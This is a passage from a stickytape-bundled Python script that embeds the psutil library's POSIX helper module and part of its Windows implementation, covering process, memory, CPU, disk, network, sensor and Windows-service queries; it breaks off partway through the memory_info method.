    __stickytape_write_module('psutil/_psposix.py', b'# Copyright (c) 2009, Giampaolo Rodola\'. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\n"""Routines common to all posix systems."""\n\nimport glob\nimport os\nimport signal\nimport sys\nimport time\n\nfrom ._common import TimeoutExpired\nfrom ._common import memoize\nfrom ._common import sdiskusage\nfrom ._common import usage_percent\nfrom ._compat import PY3\nfrom ._compat import ChildProcessError\nfrom ._compat import FileNotFoundError\nfrom ._compat import InterruptedError\nfrom ._compat import PermissionError\nfrom ._compat import ProcessLookupError\nfrom ._compat import unicode\n\n\nif sys.version_info >= (3, 4):\n    import enum\nelse:\n    enum = None\n\n\n__all__ = [\'pid_exists\', \'wait_pid\', \'disk_usage\', \'get_terminal_map\']\n\n\ndef pid_exists(pid):\n    """Check whether pid exists in the current process table."""\n    if pid == 0:\n        # According to "man 2 kill" PID 0 has a special meaning:\n        # it refers to <<every process in the process group of the\n        # calling process>> so we don\'t want to go any further.\n        # If we get here it means this UNIX platform *does* have\n        # a process with id 0.\n        return True\n    try:\n        os.kill(pid, 0)\n    except ProcessLookupError:\n        return False\n    except PermissionError:\n        # EPERM clearly means there\'s a process to deny access to\n        return True\n    # According to "man 2 kill" possible error values are\n    # (EINVAL, EPERM, ESRCH)\n    else:\n        return True\n\n\n# Python 3.5 signals enum (contributed by me ^^):\n# https://bugs.python.org/issue21076\nif enum is not None and hasattr(signal, "Signals"):\n    Negsignal = enum.IntEnum(\n        \'Negsignal\', dict([(x.name, -x.value) for x in signal.Signals]))\n\n    def negsig_to_enum(num):\n        """Convert a negative signal value to an enum."""\n        try:\n            return Negsignal(num)\n        except ValueError:\n            return num\nelse:  # pragma: no cover\n    def negsig_to_enum(num):\n        return num\n\n\ndef wait_pid(pid, timeout=None, proc_name=None,\n             _waitpid=os.waitpid,\n             _timer=getattr(time, \'monotonic\', time.time),\n             _min=min,\n             _sleep=time.sleep,\n             _pid_exists=pid_exists):\n    """Wait for a process PID to terminate.\n\n    If the process terminated normally by calling exit(3) or _exit(2),\n    or by returning from main(), the return value is the positive integer\n    passed to *exit().\n\n    If it was terminated by a signal it returns the negated value of the\n    signal which caused the termination (e.g. -SIGTERM).\n\n    If PID is not a children of os.getpid() (current process) just\n    wait until the process disappears and return None.\n\n    If PID does not exist at all return None immediately.\n\n    If *timeout* != None and process is still alive raise TimeoutExpired.\n    timeout=0 is also possible (either return immediately or raise).\n    """\n    if pid <= 0:\n        raise ValueError("can\'t wait for PID 0")  # see "man waitpid"\n    interval = 0.0001\n    flags = 0\n    if timeout is not None:\n        flags |= os.WNOHANG\n        stop_at = _timer() + timeout\n\n    def sleep(interval):\n        # Sleep for some time and return a new increased interval.\n        if timeout is not None:\n            if _timer() >= stop_at:\n                raise TimeoutExpired(timeout, pid=pid, name=proc_name)\n        _sleep(interval)\n        return _min(interval * 2, 0.04)\n\n    # See: https://linux.die.net/man/2/waitpid\n    while True:\n        try:\n            retpid, status = os.waitpid(pid, flags)\n        except InterruptedError:\n            interval = sleep(interval)\n        except ChildProcessError:\n            # This has two meanings:\n            # - PID is not a child of os.getpid() in which case\n            #   we keep polling until it\'s gone\n            # - PID never existed in the first place\n            # In both cases we\'ll eventually return None as we\n            # can\'t determine its exit status code.\n            while _pid_exists(pid):\n                interval = sleep(interval)\n            return\n        else:\n            if retpid == 0:\n                # WNOHANG flag was used and PID is still running.\n                interval = sleep(interval)\n                continue\n            elif os.WIFEXITED(status):\n                # Process terminated normally by calling exit(3) or _exit(2),\n                # or by returning from main(). The return value is the\n                # positive integer passed to *exit().\n                return os.WEXITSTATUS(status)\n            elif os.WIFSIGNALED(status):\n                # Process exited due to a signal. Return the negative value\n                # of that signal.\n                return negsig_to_enum(-os.WTERMSIG(status))\n            # elif os.WIFSTOPPED(status):\n            #     # Process was stopped via SIGSTOP or is being traced, and\n            #     # waitpid() was called with WUNTRACED flag. PID is still\n            #     # alive. From now on waitpid() will keep returning (0, 0)\n            #     # until the process state doesn\'t change.\n            #     # It may make sense to catch/enable this since stopped PIDs\n            #     # ignore SIGTERM.\n            #     interval = sleep(interval)\n            #     continue\n            # elif os.WIFCONTINUED(status):\n            #     # Process was resumed via SIGCONT and waitpid() was called\n            #     # with WCONTINUED flag.\n            #     interval = sleep(interval)\n            #     continue\n            else:\n                # Should never happen.\n                raise ValueError("unknown process exit status %r" % status)\n\n\ndef disk_usage(path):\n    """Return disk usage associated with path.\n    Note: UNIX usually reserves 5% disk space which is not accessible\n    by user. In this function "total" and "used" values reflect the\n    total and used disk space whereas "free" and "percent" represent\n    the "free" and "used percent" user disk space.\n    """\n    if PY3:\n        st = os.statvfs(path)\n    else:  # pragma: no cover\n        # os.statvfs() does not support unicode on Python 2:\n        # - https://github.com/giampaolo/psutil/issues/416\n        # - http://bugs.python.org/issue18695\n        try:\n            st = os.statvfs(path)\n        except UnicodeEncodeError:\n            if isinstance(path, unicode):\n                try:\n                    path = path.encode(sys.getfilesystemencoding())\n                except UnicodeEncodeError:\n                    pass\n                st = os.statvfs(path)\n            else:\n                raise\n\n    # Total space which is only available to root (unless changed\n    # at system level).\n    total = (st.f_blocks * st.f_frsize)\n    # Remaining free space usable by root.\n    avail_to_root = (st.f_bfree * st.f_frsize)\n    # Remaining free space usable by user.\n    avail_to_user = (st.f_bavail * st.f_frsize)\n    # Total space being used in general.\n    used = (total - avail_to_root)\n    # Total space which is available to user (same as \'total\' but\n    # for the user).\n    total_user = used + avail_to_user\n    # User usage percent compared to the total amount of space\n    # the user can use. This number would be higher if compared\n    # to root\'s because the user has less space (usually -5%).\n    usage_percent_user = usage_percent(used, total_user, round_=1)\n\n    # NB: the percentage is -5% than what shown by df due to\n    # reserved blocks that we are currently not considering:\n    # https://github.com/giampaolo/psutil/issues/829#issuecomment-223750462\n    return sdiskusage(\n        total=total, used=used, free=avail_to_user, percent=usage_percent_user)\n\n\n@memoize\ndef get_terminal_map():\n    """Get a map of device-id -> path as a dict.\n    Used by Process.terminal()\n    """\n    ret = {}\n    ls = glob.glob(\'/dev/tty*\') + glob.glob(\'/dev/pts/*\')\n    for name in ls:\n        assert name not in ret, name\n        try:\n            ret[os.stat(name).st_rdev] = name\n        except FileNotFoundError:\n            pass\n    return ret\n')
    __stickytape_write_module('psutil/_pswindows.py', b'# Copyright (c) 2009, Giampaolo Rodola\'. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\n"""Windows platform implementation."""\n\nimport contextlib\nimport errno\nimport functools\nimport os\nimport signal\nimport sys\nimport time\nfrom collections import namedtuple\n\nfrom . import _common\nfrom ._common import ENCODING\nfrom ._common import ENCODING_ERRS\nfrom ._common import AccessDenied\nfrom ._common import NoSuchProcess\nfrom ._common import TimeoutExpired\nfrom ._common import conn_tmap\nfrom ._common import conn_to_ntuple\nfrom ._common import debug\nfrom ._common import isfile_strict\nfrom ._common import memoize\nfrom ._common import memoize_when_activated\nfrom ._common import parse_environ_block\nfrom ._common import usage_percent\nfrom ._compat import PY3\nfrom ._compat import long\nfrom ._compat import lru_cache\nfrom ._compat import range\nfrom ._compat import unicode\nfrom ._psutil_windows import ABOVE_NORMAL_PRIORITY_CLASS\nfrom ._psutil_windows import BELOW_NORMAL_PRIORITY_CLASS\nfrom ._psutil_windows import HIGH_PRIORITY_CLASS\nfrom ._psutil_windows import IDLE_PRIORITY_CLASS\nfrom ._psutil_windows import NORMAL_PRIORITY_CLASS\nfrom ._psutil_windows import REALTIME_PRIORITY_CLASS\n\n\ntry:\n    from . import _psutil_windows as cext\nexcept ImportError as err:\n    if str(err).lower().startswith("dll load failed") and \\\n            sys.getwindowsversion()[0] < 6:\n        # We may get here if:\n        # 1) we are on an old Windows version\n        # 2) psutil was installed via pip + wheel\n        # See: https://github.com/giampaolo/psutil/issues/811\n        msg = "this Windows version is too old (< Windows Vista); "\n        msg += "psutil 3.4.2 is the latest version which supports Windows "\n        msg += "2000, XP and 2003 server"\n        raise RuntimeError(msg)\n    else:\n        raise\n\nif sys.version_info >= (3, 4):\n    import enum\nelse:\n    enum = None\n\n# process priority constants, import from __init__.py:\n# http://msdn.microsoft.com/en-us/library/ms686219(v=vs.85).aspx\n__extra__all__ = [\n    "win_service_iter", "win_service_get",\n    # Process priority\n    "ABOVE_NORMAL_PRIORITY_CLASS", "BELOW_NORMAL_PRIORITY_CLASS",\n    "HIGH_PRIORITY_CLASS", "IDLE_PRIORITY_CLASS", "NORMAL_PRIORITY_CLASS",\n    "REALTIME_PRIORITY_CLASS",\n    # IO priority\n    "IOPRIO_VERYLOW", "IOPRIO_LOW", "IOPRIO_NORMAL", "IOPRIO_HIGH",\n    # others\n    "CONN_DELETE_TCB", "AF_LINK",\n]\n\n\n# =====================================================================\n# --- globals\n# =====================================================================\n\nCONN_DELETE_TCB = "DELETE_TCB"\nERROR_PARTIAL_COPY = 299\nPYPY = \'__pypy__\' in sys.builtin_module_names\n\nif enum is None:\n    AF_LINK = -1\nelse:\n    AddressFamily = enum.IntEnum(\'AddressFamily\', {\'AF_LINK\': -1})\n    AF_LINK = AddressFamily.AF_LINK\n\nTCP_STATUSES = {\n    cext.MIB_TCP_STATE_ESTAB: _common.CONN_ESTABLISHED,\n    cext.MIB_TCP_STATE_SYN_SENT: _common.CONN_SYN_SENT,\n    cext.MIB_TCP_STATE_SYN_RCVD: _common.CONN_SYN_RECV,\n    cext.MIB_TCP_STATE_FIN_WAIT1: _common.CONN_FIN_WAIT1,\n    cext.MIB_TCP_STATE_FIN_WAIT2: _common.CONN_FIN_WAIT2,\n    cext.MIB_TCP_STATE_TIME_WAIT: _common.CONN_TIME_WAIT,\n    cext.MIB_TCP_STATE_CLOSED: _common.CONN_CLOSE,\n    cext.MIB_TCP_STATE_CLOSE_WAIT: _common.CONN_CLOSE_WAIT,\n    cext.MIB_TCP_STATE_LAST_ACK: _common.CONN_LAST_ACK,\n    cext.MIB_TCP_STATE_LISTEN: _common.CONN_LISTEN,\n    cext.MIB_TCP_STATE_CLOSING: _common.CONN_CLOSING,\n    cext.MIB_TCP_STATE_DELETE_TCB: CONN_DELETE_TCB,\n    cext.PSUTIL_CONN_NONE: _common.CONN_NONE,\n}\n\nif enum is not None:\n    class Priority(enum.IntEnum):\n        ABOVE_NORMAL_PRIORITY_CLASS = ABOVE_NORMAL_PRIORITY_CLASS\n        BELOW_NORMAL_PRIORITY_CLASS = BELOW_NORMAL_PRIORITY_CLASS\n        HIGH_PRIORITY_CLASS = HIGH_PRIORITY_CLASS\n        IDLE_PRIORITY_CLASS = IDLE_PRIORITY_CLASS\n        NORMAL_PRIORITY_CLASS = NORMAL_PRIORITY_CLASS\n        REALTIME_PRIORITY_CLASS = REALTIME_PRIORITY_CLASS\n\n    globals().update(Priority.__members__)\n\nif enum is None:\n    IOPRIO_VERYLOW = 0\n    IOPRIO_LOW = 1\n    IOPRIO_NORMAL = 2\n    IOPRIO_HIGH = 3\nelse:\n    class IOPriority(enum.IntEnum):\n        IOPRIO_VERYLOW = 0\n        IOPRIO_LOW = 1\n        IOPRIO_NORMAL = 2\n        IOPRIO_HIGH = 3\n    globals().update(IOPriority.__members__)\n\npinfo_map = dict(\n    num_handles=0,\n    ctx_switches=1,\n    user_time=2,\n    kernel_time=3,\n    create_time=4,\n    num_threads=5,\n    io_rcount=6,\n    io_wcount=7,\n    io_rbytes=8,\n    io_wbytes=9,\n    io_count_others=10,\n    io_bytes_others=11,\n    num_page_faults=12,\n    peak_wset=13,\n    wset=14,\n    peak_paged_pool=15,\n    paged_pool=16,\n    peak_non_paged_pool=17,\n    non_paged_pool=18,\n    pagefile=19,\n    peak_pagefile=20,\n    mem_private=21,\n)\n\n\n# =====================================================================\n# --- named tuples\n# =====================================================================\n\n\n# psutil.cpu_times()\nscputimes = namedtuple(\'scputimes\',\n                       [\'user\', \'system\', \'idle\', \'interrupt\', \'dpc\'])\n# psutil.virtual_memory()\nsvmem = namedtuple(\'svmem\', [\'total\', \'available\', \'percent\', \'used\', \'free\'])\n# psutil.Process.memory_info()\npmem = namedtuple(\n    \'pmem\', [\'rss\', \'vms\',\n             \'num_page_faults\', \'peak_wset\', \'wset\', \'peak_paged_pool\',\n             \'paged_pool\', \'peak_nonpaged_pool\', \'nonpaged_pool\',\n             \'pagefile\', \'peak_pagefile\', \'private\'])\n# psutil.Process.memory_full_info()\npfullmem = namedtuple(\'pfullmem\', pmem._fields + (\'uss\', ))\n# psutil.Process.memory_maps(grouped=True)\npmmap_grouped = namedtuple(\'pmmap_grouped\', [\'path\', \'rss\'])\n# psutil.Process.memory_maps(grouped=False)\npmmap_ext = namedtuple(\n    \'pmmap_ext\', \'addr perms \' + \' \'.join(pmmap_grouped._fields))\n# psutil.Process.io_counters()\npio = namedtuple(\'pio\', [\'read_count\', \'write_count\',\n                         \'read_bytes\', \'write_bytes\',\n                         \'other_count\', \'other_bytes\'])\n\n\n# =====================================================================\n# --- utils\n# =====================================================================\n\n\n@lru_cache(maxsize=512)\ndef convert_dos_path(s):\n    r"""Convert paths using native DOS format like:\n        "\\Device\\HarddiskVolume1\\Windows\\systemew\\file.txt"\n    into:\n        "C:\\Windows\\systemew\\file.txt"\n    """\n    rawdrive = \'\\\\\'.join(s.split(\'\\\\\')[:3])\n    driveletter = cext.QueryDosDevice(rawdrive)\n    remainder = s[len(rawdrive):]\n    return os.path.join(driveletter, remainder)\n\n\ndef py2_strencode(s):\n    """Encode a unicode string to a byte string by using the default fs\n    encoding + "replace" error handler.\n    """\n    if PY3:\n        return s\n    else:\n        if isinstance(s, str):\n            return s\n        else:\n            return s.encode(ENCODING, ENCODING_ERRS)\n\n\n@memoize\ndef getpagesize():\n    return cext.getpagesize()\n\n\n# =====================================================================\n# --- memory\n# =====================================================================\n\n\ndef virtual_memory():\n    """System virtual memory as a namedtuple."""\n    mem = cext.virtual_mem()\n    totphys, availphys, totpagef, availpagef, totvirt, freevirt = mem\n    #\n    total = totphys\n    avail = availphys\n    free = availphys\n    used = total - avail\n    percent = usage_percent((total - avail), total, round_=1)\n    return svmem(total, avail, percent, used, free)\n\n\ndef swap_memory():\n    """Swap system memory as a (total, used, free, sin, sout) tuple."""\n    mem = cext.virtual_mem()\n\n    total_phys = mem[0]\n    free_phys = mem[1]\n    total_system = mem[2]\n    free_system = mem[3]\n\n    # Despite the name PageFile refers to total system memory here\n    # thus physical memory values need to be subtracted to get swap values\n    total = total_system - total_phys\n    free = min(total, free_system - free_phys)\n    used = total - free\n    percent = usage_percent(used, total, round_=1)\n    return _common.sswap(total, used, free, percent, 0, 0)\n\n\n# =====================================================================\n# --- disk\n# =====================================================================\n\n\ndisk_io_counters = cext.disk_io_counters\n\n\ndef disk_usage(path):\n    """Return disk usage associated with path."""\n    if PY3 and isinstance(path, bytes):\n        # XXX: do we want to use "strict"? Probably yes, in order\n        # to fail immediately. After all we are accepting input here...\n        path = path.decode(ENCODING, errors="strict")\n    total, free = cext.disk_usage(path)\n    used = total - free\n    percent = usage_percent(used, total, round_=1)\n    return _common.sdiskusage(total, used, free, percent)\n\n\ndef disk_partitions(all):\n    """Return disk partitions."""\n    rawlist = cext.disk_partitions(all)\n    return [_common.sdiskpart(*x) for x in rawlist]\n\n\n# =====================================================================\n# --- CPU\n# =====================================================================\n\n\ndef cpu_times():\n    """Return system CPU times as a named tuple."""\n    user, system, idle = cext.cpu_times()\n    # Internally, GetSystemTimes() is used, and it doesn\'t return\n    # interrupt and dpc times. cext.per_cpu_times() does, so we\n    # rely on it to get those only.\n    percpu_summed = scputimes(*[sum(n) for n in zip(*cext.per_cpu_times())])\n    return scputimes(user, system, idle,\n                     percpu_summed.interrupt, percpu_summed.dpc)\n\n\ndef per_cpu_times():\n    """Return system per-CPU times as a list of named tuples."""\n    ret = []\n    for user, system, idle, interrupt, dpc in cext.per_cpu_times():\n        item = scputimes(user, system, idle, interrupt, dpc)\n        ret.append(item)\n    return ret\n\n\ndef cpu_count_logical():\n    """Return the number of logical CPUs in the system."""\n    return cext.cpu_count_logical()\n\n\ndef cpu_count_cores():\n    """Return the number of CPU cores in the system."""\n    return cext.cpu_count_cores()\n\n\ndef cpu_stats():\n    """Return CPU statistics."""\n    ctx_switches, interrupts, dpcs, syscalls = cext.cpu_stats()\n    soft_interrupts = 0\n    return _common.scpustats(ctx_switches, interrupts, soft_interrupts,\n                             syscalls)\n\n\ndef cpu_freq():\n    """Return CPU frequency.\n    On Windows per-cpu frequency is not supported.\n    """\n    curr, max_ = cext.cpu_freq()\n    min_ = 0.0\n    return [_common.scpufreq(float(curr), min_, float(max_))]\n\n\n_loadavg_inititialized = False\n\n\ndef getloadavg():\n    """Return the number of processes in the system run queue averaged\n    over the last 1, 5, and 15 minutes respectively as a tuple"""\n    global _loadavg_inititialized\n\n    if not _loadavg_inititialized:\n        cext.init_loadavg_counter()\n        _loadavg_inititialized = True\n\n    # Drop to 2 decimal points which is what Linux does\n    raw_loads = cext.getloadavg()\n    return tuple([round(load, 2) for load in raw_loads])\n\n\n# =====================================================================\n# --- network\n# =====================================================================\n\n\ndef net_connections(kind, _pid=-1):\n    """Return socket connections.  If pid == -1 return system-wide\n    connections (as opposed to connections opened by one process only).\n    """\n    if kind not in conn_tmap:\n        raise ValueError("invalid %r kind argument; choose between %s"\n                         % (kind, \', \'.join([repr(x) for x in conn_tmap])))\n    families, types = conn_tmap[kind]\n    rawlist = cext.net_connections(_pid, families, types)\n    ret = set()\n    for item in rawlist:\n        fd, fam, type, laddr, raddr, status, pid = item\n        nt = conn_to_ntuple(fd, fam, type, laddr, raddr, status, TCP_STATUSES,\n                            pid=pid if _pid == -1 else None)\n        ret.add(nt)\n    return list(ret)\n\n\ndef net_if_stats():\n    """Get NIC stats (isup, duplex, speed, mtu)."""\n    ret = {}\n    rawdict = cext.net_if_stats()\n    for name, items in rawdict.items():\n        if not PY3:\n            assert isinstance(name, unicode), type(name)\n            name = py2_strencode(name)\n        isup, duplex, speed, mtu = items\n        if hasattr(_common, \'NicDuplex\'):\n            duplex = _common.NicDuplex(duplex)\n        ret[name] = _common.snicstats(isup, duplex, speed, mtu)\n    return ret\n\n\ndef net_io_counters():\n    """Return network I/O statistics for every network interface\n    installed on the system as a dict of raw tuples.\n    """\n    ret = cext.net_io_counters()\n    return dict([(py2_strencode(k), v) for k, v in ret.items()])\n\n\ndef net_if_addrs():\n    """Return the addresses associated to each NIC."""\n    ret = []\n    for items in cext.net_if_addrs():\n        items = list(items)\n        items[0] = py2_strencode(items[0])\n        ret.append(items)\n    return ret\n\n\n# =====================================================================\n# --- sensors\n# =====================================================================\n\n\ndef sensors_battery():\n    """Return battery information."""\n    # For constants meaning see:\n    # https://msdn.microsoft.com/en-us/library/windows/desktop/\n    #     aa373232(v=vs.85).aspx\n    acline_status, flags, percent, secsleft = cext.sensors_battery()\n    power_plugged = acline_status == 1\n    no_battery = bool(flags & 128)\n    charging = bool(flags & 8)\n\n    if no_battery:\n        return None\n    if power_plugged or charging:\n        secsleft = _common.POWER_TIME_UNLIMITED\n    elif secsleft == -1:\n        secsleft = _common.POWER_TIME_UNKNOWN\n\n    return _common.sbattery(percent, secsleft, power_plugged)\n\n\n# =====================================================================\n# --- other system functions\n# =====================================================================\n\n\n_last_btime = 0\n\n\ndef boot_time():\n    """The system boot time expressed in seconds since the epoch."""\n    # This dirty hack is to adjust the precision of the returned\n    # value which may have a 1 second fluctuation, see:\n    # https://github.com/giampaolo/psutil/issues/1007\n    global _last_btime\n    ret = float(cext.boot_time())\n    if abs(ret - _last_btime) <= 1:\n        return _last_btime\n    else:\n        _last_btime = ret\n        return ret\n\n\ndef users():\n    """Return currently connected users as a list of namedtuples."""\n    retlist = []\n    rawlist = cext.users()\n    for item in rawlist:\n        user, hostname, tstamp = item\n        user = py2_strencode(user)\n        nt = _common.suser(user, None, hostname, tstamp, None)\n        retlist.append(nt)\n    return retlist\n\n\n# =====================================================================\n# --- Windows services\n# =====================================================================\n\n\ndef win_service_iter():\n    """Yields a list of WindowsService instances."""\n    for name, display_name in cext.winservice_enumerate():\n        yield WindowsService(py2_strencode(name), py2_strencode(display_name))\n\n\ndef win_service_get(name):\n    """Open a Windows service and return it as a WindowsService instance."""\n    service = WindowsService(name, None)\n    service._display_name = service._query_config()[\'display_name\']\n    return service\n\n\nclass WindowsService(object):\n    """Represents an installed Windows service."""\n\n    def __init__(self, name, display_name):\n        self._name = name\n        self._display_name = display_name\n\n    def __str__(self):\n        details = "(name=%r, display_name=%r)" % (\n            self._name, self._display_name)\n        return "%s%s" % (self.__class__.__name__, details)\n\n    def __repr__(self):\n        return "<%s at %s>" % (self.__str__(), id(self))\n\n    def __eq__(self, other):\n        # Test for equality with another WindosService object based\n        # on name.\n        if not isinstance(other, WindowsService):\n            return NotImplemented\n        return self._name == other._name\n\n    def __ne__(self, other):\n        return not self == other\n\n    def _query_config(self):\n        with self._wrap_exceptions():\n            display_name, binpath, username, start_type = \\\n                cext.winservice_query_config(self._name)\n        # XXX - update _self.display_name?\n        return dict(\n            display_name=py2_strencode(display_name),\n            binpath=py2_strencode(binpath),\n            username=py2_strencode(username),\n            start_type=py2_strencode(start_type))\n\n    def _query_status(self):\n        with self._wrap_exceptions():\n            status, pid = cext.winservice_query_status(self._name)\n        if pid == 0:\n            pid = None\n        return dict(status=status, pid=pid)\n\n    @contextlib.contextmanager\n    def _wrap_exceptions(self):\n        """Ctx manager which translates bare OSError and WindowsError\n        exceptions into NoSuchProcess and AccessDenied.\n        """\n        try:\n            yield\n        except OSError as err:\n            if is_permission_err(err):\n                raise AccessDenied(\n                    pid=None, name=self._name,\n                    msg="service %r is not querable (not enough privileges)" %\n                        self._name)\n            elif err.winerror in (cext.ERROR_INVALID_NAME,\n                                  cext.ERROR_SERVICE_DOES_NOT_EXIST):\n                raise NoSuchProcess(\n                    pid=None, name=self._name,\n                    msg="service %r does not exist)" % self._name)\n            else:\n                raise\n\n    # config query\n\n    def name(self):\n        """The service name. This string is how a service is referenced\n        and can be passed to win_service_get() to get a new\n        WindowsService instance.\n        """\n        return self._name\n\n    def display_name(self):\n        """The service display name. The value is cached when this class\n        is instantiated.\n        """\n        return self._display_name\n\n    def binpath(self):\n        """The fully qualified path to the service binary/exe file as\n        a string, including command line arguments.\n        """\n        return self._query_config()[\'binpath\']\n\n    def username(self):\n        """The name of the user that owns this service."""\n        return self._query_config()[\'username\']\n\n    def start_type(self):\n        """A string which can either be "automatic", "manual" or\n        "disabled".\n        """\n        return self._query_config()[\'start_type\']\n\n    # status query\n\n    def pid(self):\n        """The process PID, if any, else None. This can be passed\n        to Process class to control the service\'s process.\n        """\n        return self._query_status()[\'pid\']\n\n    def status(self):\n        """Service status as a string."""\n        return self._query_status()[\'status\']\n\n    def description(self):\n        """Service long description."""\n        return py2_strencode(cext.winservice_query_descr(self.name()))\n\n    # utils\n\n    def as_dict(self):\n        """Utility method retrieving all the information above as a\n        dictionary.\n        """\n        d = self._query_config()\n        d.update(self._query_status())\n        d[\'name\'] = self.name()\n        d[\'display_name\'] = self.display_name()\n        d[\'description\'] = self.description()\n        return d\n\n    # actions\n    # XXX: the necessary C bindings for start() and stop() are\n    # implemented but for now I prefer not to expose them.\n    # I may change my mind in the future. Reasons:\n    # - they require Administrator privileges\n    # - can\'t implement a timeout for stop() (unless by using a thread,\n    #   which sucks)\n    # - would require adding ServiceAlreadyStarted and\n    #   ServiceAlreadyStopped exceptions, adding two new APIs.\n    # - we might also want to have modify(), which would basically mean\n    #   rewriting win32serviceutil.ChangeServiceConfig, which involves a\n    #   lot of stuff (and API constants which would pollute the API), see:\n    #   http://pyxr.sourceforge.net/PyXR/c/python24/lib/site-packages/\n    #       win32/lib/win32serviceutil.py.html#0175\n    # - psutil is typically about "read only" monitoring stuff;\n    #   win_service_* APIs should only be used to retrieve a service and\n    #   check whether it\'s running\n\n    # def start(self, timeout=None):\n    #     with self._wrap_exceptions():\n    #         cext.winservice_start(self.name())\n    #         if timeout:\n    #             giveup_at = time.time() + timeout\n    #             while True:\n    #                 if self.status() == "running":\n    #                     return\n    #                 else:\n    #                     if time.time() > giveup_at:\n    #                         raise TimeoutExpired(timeout)\n    #                     else:\n    #                         time.sleep(.1)\n\n    # def stop(self):\n    #     # Note: timeout is not implemented because it\'s just not\n    #     # possible, see:\n    #     # http://stackoverflow.com/questions/11973228/\n    #     with self._wrap_exceptions():\n    #         return cext.winservice_stop(self.name())\n\n\n# =====================================================================\n# --- processes\n# =====================================================================\n\n\npids = cext.pids\npid_exists = cext.pid_exists\nppid_map = cext.ppid_map  # used internally by Process.children()\n\n\ndef is_permission_err(exc):\n    """Return True if this is a permission error."""\n    assert isinstance(exc, OSError), exc\n    # On Python 2 OSError doesn\'t always have \'winerror\'. Sometimes\n    # it does, in which case the original exception was WindowsError\n    # (which is a subclass of OSError).\n    return exc.errno in (errno.EPERM, errno.EACCES) or \\\n        getattr(exc, "winerror", -1) in (cext.ERROR_ACCESS_DENIED,\n                                         cext.ERROR_PRIVILEGE_NOT_HELD)\n\n\ndef convert_oserror(exc, pid=None, name=None):\n    """Convert OSError into NoSuchProcess or AccessDenied."""\n    assert isinstance(exc, OSError), exc\n    if is_permission_err(exc):\n        return AccessDenied(pid=pid, name=name)\n    if exc.errno == errno.ESRCH:\n        return NoSuchProcess(pid=pid, name=name)\n    raise exc\n\n\ndef wrap_exceptions(fun):\n    """Decorator which converts OSError into NoSuchProcess or AccessDenied."""\n    @functools.wraps(fun)\n    def wrapper(self, *args, **kwargs):\n        try:\n            return fun(self, *args, **kwargs)\n        except OSError as err:\n            raise convert_oserror(err, pid=self.pid, name=self._name)\n    return wrapper\n\n\ndef retry_error_partial_copy(fun):\n    """Workaround for https://github.com/giampaolo/psutil/issues/875.\n    See: https://stackoverflow.com/questions/4457745#4457745\n    """\n    @functools.wraps(fun)\n    def wrapper(self, *args, **kwargs):\n        delay = 0.0001\n        times = 33\n        for x in range(times):  # retries for roughly 1 second\n            try:\n                return fun(self, *args, **kwargs)\n            except WindowsError as _:\n                err = _\n                if err.winerror == ERROR_PARTIAL_COPY:\n                    time.sleep(delay)\n                    delay = min(delay * 2, 0.04)\n                    continue\n                else:\n                    raise\n        else:\n            msg = "%s retried %s times, converted to AccessDenied as it\'s " \\\n                "still returning %r" % (fun, times, err)\n            raise AccessDenied(pid=self.pid, name=self._name, msg=msg)\n    return wrapper\n\n\nclass Process(object):\n    """Wrapper class around underlying C implementation."""\n\n    __slots__ = ["pid", "_name", "_ppid", "_cache"]\n\n    def __init__(self, pid):\n        self.pid = pid\n        self._name = None\n        self._ppid = None\n\n    # --- oneshot() stuff\n\n    def oneshot_enter(self):\n        self._proc_info.cache_activate(self)\n        self.exe.cache_activate(self)\n\n    def oneshot_exit(self):\n        self._proc_info.cache_deactivate(self)\n        self.exe.cache_deactivate(self)\n\n    @memoize_when_activated\n    def _proc_info(self):\n        """Return multiple information about this process as a\n        raw tuple.\n        """\n        ret = cext.proc_info(self.pid)\n        assert len(ret) == len(pinfo_map)\n        return ret\n\n    def name(self):\n        """Return process name, which on Windows is always the final\n        part of the executable.\n        """\n        # This is how PIDs 0 and 4 are always represented in taskmgr\n        # and process-hacker.\n        if self.pid == 0:\n            return "System Idle Process"\n        if self.pid == 4:\n            return "System"\n        return os.path.basename(self.exe())\n\n    @wrap_exceptions\n    @memoize_when_activated\n    def exe(self):\n        if PYPY:\n            try:\n                exe = cext.proc_exe(self.pid)\n            except WindowsError as err:\n                # 24 = ERROR_TOO_MANY_OPEN_FILES. Not sure why this happens\n                # (perhaps PyPy\'s JIT delaying garbage collection of files?).\n                if err.errno == 24:\n                    debug("%r translated into AccessDenied" % err)\n                    raise AccessDenied(self.pid, self._name)\n                raise\n        else:\n            exe = cext.proc_exe(self.pid)\n        if not PY3:\n            exe = py2_strencode(exe)\n        if exe.startswith(\'\\\\\'):\n            return convert_dos_path(exe)\n        return exe  # May be "Registry", "MemCompression", ...\n\n    @wrap_exceptions\n    @retry_error_partial_copy\n    def cmdline(self):\n        if cext.WINVER >= cext.WINDOWS_8_1:\n            # PEB method detects cmdline changes but requires more\n            # privileges: https://github.com/giampaolo/psutil/pull/1398\n            try:\n                ret = cext.proc_cmdline(self.pid, use_peb=True)\n            except OSError as err:\n                if is_permission_err(err):\n                    ret = cext.proc_cmdline(self.pid, use_peb=False)\n                else:\n                    raise\n        else:\n            ret = cext.proc_cmdline(self.pid, use_peb=True)\n        if PY3:\n            return ret\n        else:\n            return [py2_strencode(s) for s in ret]\n\n    @wrap_exceptions\n    @retry_error_partial_copy\n    def environ(self):\n        ustr = cext.proc_environ(self.pid)\n        if ustr and not PY3:\n            assert isinstance(ustr, unicode), type(ustr)\n        return parse_environ_block(py2_strencode(ustr))\n\n    def ppid(self):\n        try:\n            return ppid_map()[self.pid]\n        except KeyError:\n            raise NoSuchProcess(self.pid, self._name)\n\n    def _get_raw_meminfo(self):\n        try:\n            return cext.proc_memory_info(self.pid)\n        except OSError as err:\n            if is_permission_err(err):\n                # TODO: the C ext can probably be refactored in order\n                # to get this from cext.proc_info()\n                info = self._proc_info()\n                return (\n                    info[pinfo_map[\'num_page_faults\']],\n                    info[pinfo_map[\'peak_wset\']],\n                    info[pinfo_map[\'wset\']],\n                    info[pinfo_map[\'peak_paged_pool\']],\n                    info[pinfo_map[\'paged_pool\']],\n                    info[pinfo_map[\'peak_non_paged_pool\']],\n                    info[pinfo_map[\'non_paged_pool\']],\n                    info[pinfo_map[\'pagefile\']],\n                    info[pinfo_map[\'peak_pagefile\']],\n                    info[pinfo_map[\'mem_private\']],\n                )\n            raise\n\n    @wrap_exceptions\n    def memory_info(self):\n        # on Windows RSS == WorkingSetSize and VSM == PagefileUsage.\n        # Underlying C function returns fields of 